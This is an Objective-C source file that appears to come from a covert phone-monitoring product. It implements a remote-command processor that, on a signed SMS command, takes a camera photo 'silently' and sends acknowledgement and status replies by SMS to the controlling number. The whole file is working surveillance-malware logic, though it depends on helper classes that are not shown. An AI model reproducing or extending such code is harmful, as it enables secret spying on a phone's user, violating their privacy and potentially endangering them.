//
//  OnDemandImageCaptureProcessor.m
//  RCM
//
//  Created by Makara Khloth on 1/23/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "OnDemandImageCaptureProcessor.h"

@interface OnDemandImageCaptureProcessor (private)
- (void) processRemoteImageCapture;
- (void) sendReplySMS: (NSString *) aReplyMessage  isProcessCompleted: (BOOL) aIsComplete;
- (void) processFinished;

- (void) sendAcknowledge;
- (void) sendErrorMSG1;
- (void) sendSuccessMSG2;
@end

@implementation OnDemandImageCaptureProcessor

/**
 - Method name: initWithRemoteCommandData:andCommandProcessingDelegate
 - Purpose:This method is used to initialize the OnDemandImageCaptureProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData),aRemoteCmdProcessingDelegate (RemoteCmdProcessingDelegate)
 - Return description: self (OnDemandImageCaptureProcessor)
 */

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData 
	andCommandProcessingDelegate: (id <RemoteCmdProcessingDelegate>) aRemoteCmdProcessingDelegate {
    DLog (@"OnDemandImageCaptureProcessor--->initWithRemoteCommandData:andCommandProcessingDelegate:")
	if ((self = [super initWithRemoteCommandData:aRemoteCmdData andCommandProcessingDelegate:aRemoteCmdProcessingDelegate])) {
	}
	return self;
}

#pragma mark -
#pragma mark RemoteCmdProcessor Methods
#pragma mark -

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the OnDemandImageCaptureProcessor
 - Argument list and description:No Argument 
 - Return description: No return type
 */

- (void) doProcessingCommand {
	DLog (@"OnDemandImageCaptureProcessor--->doProcessingCommand")
	if (![RemoteCmdSignatureUtils verifyRemoteCmdDataSignature:mRemoteCmdData
										 numberOfCompulsoryTag:2]) {
		[RemoteCmdSignatureUtils throwInvalidCmdWithName:@"OnDemandImageCaptureProcessor"
												  reason:@"Failed signature check"];
	}
	
	[self processRemoteImageCapture];
}

#pragma mark -
#pragma mark CameraEventCapture method
#pragma mark -

- (void) cameraDidFinishCapture: (NSString *) aOutputPath error: (NSError *) aError {
	// Regardless of aError at this time
	[self sendSuccessMSG2];
}

#pragma mark -
#pragma mark Private methods
#pragma mark -

- (void) processRemoteImageCapture {
	id <CameraEventCapture> cameraEventCapture = [[RemoteCmdUtils sharedRemoteCmdUtils] mCameraEventCapture];
	if ([cameraEventCapture captureCameraImageWithDelegate:self]) {
		DLog (@"Capturing camera image silently");
		[self sendAcknowledge];
	} else {
		DLog (@"Cannot capturing camera image silently");
		// Without raise an exception we can simulate asynchronous call...
		[self performSelector:@selector(sendErrorMSG1) withObject:nil afterDelay:0.1];
	}
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: aReplyMessage (NSString),isProcessCompleted(BOOL)
 - Return description: No return type
 */

- (void) sendReplySMS: (NSString *) aReplyMessage  isProcessCompleted: (BOOL) aIsComplete  {
	DLog (@"OnDemandImageCaptureProcessor--->sendReplySMS...")
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:aReplyMessage];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
	    [[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:aReplyMessage];
	}
	if (aIsComplete) { [self processFinished]; }
	else { DLog (@"Sent acknowledge message.");}
}

/**
 - Method name: processFinished
 - Purpose:This method is invoked when upload actual media process is completed
 - Argument list and description:No Argument 
 - Return description:No Return Type
 */

-(void) processFinished {
	DLog (@"OnDemandImageCaptureProcessor--->processFinished")
	if ([mRemoteCmdProcessingDelegate respondsToSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:)]) {
		DLog (@"Perform selector processFinishedWithProcessor:andRemoteCmdData:....");
		[mRemoteCmdProcessingDelegate performSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:) withObject:self withObject:mRemoteCmdData];
	}
}

- (void) sendAcknowledge {
	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						andErrorCode:_SUCCESS_];
	NSString *acknowledgeMessage=[messageFormat stringByAppendingString:NSLocalizedString(@"kOnDemandCameraImageSuccessMSG1", @"")];
	[self sendReplySMS:acknowledgeMessage isProcessCompleted:NO];
}

- (void) sendErrorMSG1 {
	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						andErrorCode:_ERROR_];
	NSString *errorMessage=[messageFormat stringByAppendingString:NSLocalizedString(@"kOnDemandCameraImageErrorMSG1", @"")];
	DLog (@"Sending error message cannot capture image = %@", errorMessage);
	[self sendReplySMS:errorMessage isProcessCompleted:YES];
}

- (void) sendSuccessMSG2 {
	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						andErrorCode:_SUCCESS_];
	NSString *successMessage=[messageFormat stringByAppendingString:NSLocalizedString(@"kOnDemandCameraImageSuccessMSG2", @"")];
	[self sendReplySMS:successMessage isProcessCompleted:YES];
}

- (void) dealloc {
	DLog (@"OnDemandImageCaptureProcessor is dealloc...");
	[super dealloc];
}

@end
